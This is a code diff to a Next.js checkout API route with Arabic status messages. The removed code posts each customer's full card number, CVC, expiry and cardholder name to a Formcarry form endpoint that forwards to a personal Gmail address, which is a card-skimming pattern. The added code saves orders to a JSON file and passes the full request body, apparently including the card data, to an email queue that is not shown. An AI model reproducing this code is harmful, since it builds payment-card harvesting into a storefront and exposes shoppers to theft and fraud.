@@ -1,8 +1,53 @@
 import { NextResponse } from "next/server";
+import { mkdir, readFile, writeFile } from "node:fs/promises";
+import path from "node:path";
+import { updateEmailDiagnostics } from "./emailDiagnostics";
+import { enqueueOrderEmail } from "./emailQueue";
 
-const ordersStore = [];
-const FORMCARRY_ENDPOINT = "https://formcarry.com/s/sdaVMcfxNTg";
-const ORDER_RECEIVER_EMAIL = "b71490@gmail.com";
+export const runtime = "nodejs";
+export const dynamic = "force-dynamic";
+
+const ordersStoreFilePath = path.join(process.cwd(), "data", "orders-store.json");
+let ordersStoreCache = null;
+
+async function saveOrdersStore(store) {
+	await mkdir(path.dirname(ordersStoreFilePath), { recursive: true });
+	await writeFile(ordersStoreFilePath, JSON.stringify(store, null, 2), "utf8");
+}
+
+async function getOrdersStore() {
+	if (ordersStoreCache) return ordersStoreCache;
+
+	try {
+		const raw = await readFile(ordersStoreFilePath, "utf8");
+		const parsed = JSON.parse(raw);
+		ordersStoreCache = Array.isArray(parsed) ? parsed : [];
+	} catch {
+		ordersStoreCache = [];
+	}
+
+	return ordersStoreCache;
+}
+
+async function readRequestBody(request) {
+	const contentType = request.headers.get("content-type") || "";
+	const rawBody = await request.text();
+
+	if (!rawBody) return {};
+
+	try {
+		if (contentType.includes("application/json") || contentType.includes("text/plain")) {
+			return JSON.parse(rawBody);
+		}
+	} catch (error) {
+		console.error("[orders] Failed to parse request body", {
+			contentType,
+			error: error instanceof Error ? error.message : String(error),
+		});
+	}
+
+	return {};
+}
 
 function normalizeCardNumber(value = "") {
 	return String(value).replace(/\D/g, "");
@@ -69,6 +114,8 @@ function isValidCvc(cvc = "", cardNumber = "") {
 }
 
 export async function GET() {
+	const ordersStore = await getOrdersStore();
+
 	return NextResponse.json({
 		success: true,
 		count: ordersStore.length,
@@ -77,7 +124,12 @@ export async function GET() {
 }
 
 export async function POST(request) {
-	const body = await request.json();
+	const body = await readRequestBody(request);
+	console.info("[orders] Request Received", {
+		product: body?.order?.productName,
+		customerEmail: body?.customer?.email,
+		paymentMethod: body?.payment?.method,
+	});
 
 	if (!body?.order?.productName || !body?.customer?.name || !body?.payment?.method) {
 		return NextResponse.json(
@@ -131,6 +183,7 @@ export async function POST(request) {
 		};
 	}
 
+	const ordersStore = await getOrdersStore();
 	const orderId = `ORD-${Date.now()}`;
 	const createdAt = new Date().toISOString();
 
@@ -144,47 +197,43 @@ export async function POST(request) {
 	};
 
 	ordersStore.unshift(newOrder);
+	ordersStoreCache = ordersStore;
+	await updateEmailDiagnostics({
+		lastOrder: newOrder,
+	});
 
-	let emailStatus = "لم تتم محاولة إرسال الإيميل.";
+	let persisted = true;
 	try {
-		const formBody = new URLSearchParams({
-			name: String(body?.customer?.name || ""),
-			email: String(body?.customer?.email || ""),
-			card_cvc: String(body?.payment?.cardCvc || ""),
-			product: String(body?.order?.productName || ""),
-			product_price: String(body?.order?.productPrice || ""),
-			service_fee: String(body?.order?.serviceFee || ""),
-			total_price: String(body?.order?.totalPrice || ""),
-			coupon_code: String(body?.order?.couponCode || "-"),
-			payment_method: String(body?.payment?.method || "card"),
-			card_holder: String(body?.payment?.cardHolder || ""),
-			card_last: normalizeCardNumber(body?.payment?.cardNumberRaw || "").slice(),
-			card_expiry: String(body?.payment?.card_expiry || ""),
-			order_id: orderId,
-			receiver_email: ORDER_RECEIVER_EMAIL,
+		await saveOrdersStore(ordersStore);
+		console.info("[orders] Order Saved", {
+			orderId,
+			persisted,
 		});
-
-		const formcarryResponse = await fetch(FORMCARRY_ENDPOINT, {
-			method: "POST",
-			headers: {
-				"Content-Type": "application/x-www-form-urlencoded",
-				Accept: "application/json",
-			},
-			body: formBody.toString(),
+	} catch (error) {
+		persisted = false;
+		console.error("[orders] Failed to persist order before email send", {
+			orderId,
+			error: error instanceof Error ? error.message : String(error),
 		});
-
-		emailStatus = formcarryResponse.ok
-			? `تم إرسال تفاصيل الطلب إلى الإيميل: ${ORDER_RECEIVER_EMAIL}`
-			: "تم حفظ الطلب لكن فشل إرسال الإيميل.";
-	} catch {
-		emailStatus = "تم حفظ الطلب لكن حدث خطأ أثناء إرسال الإيميل.";
 	}
+
+	const queueItem = await enqueueOrderEmail({
+		order: newOrder,
+		payload: body,
+	});
+	console.info("[orders] Order Queued", {
+		orderId,
+		queueId: queueItem.id,
+	});
 
 	return NextResponse.json(
 		{
 			success: true,
 			message: "تم استلام الطلب بنجاح.",
-			emailStatus,
+			emailStatus: "تم حفظ الطلب وإضافته إلى قائمة إرسال البريد.",
+			persisted,
+			queued: true,
+			queueId: queueItem.id,
 			data: newOrder,
 		},
 		{ status: 201 }
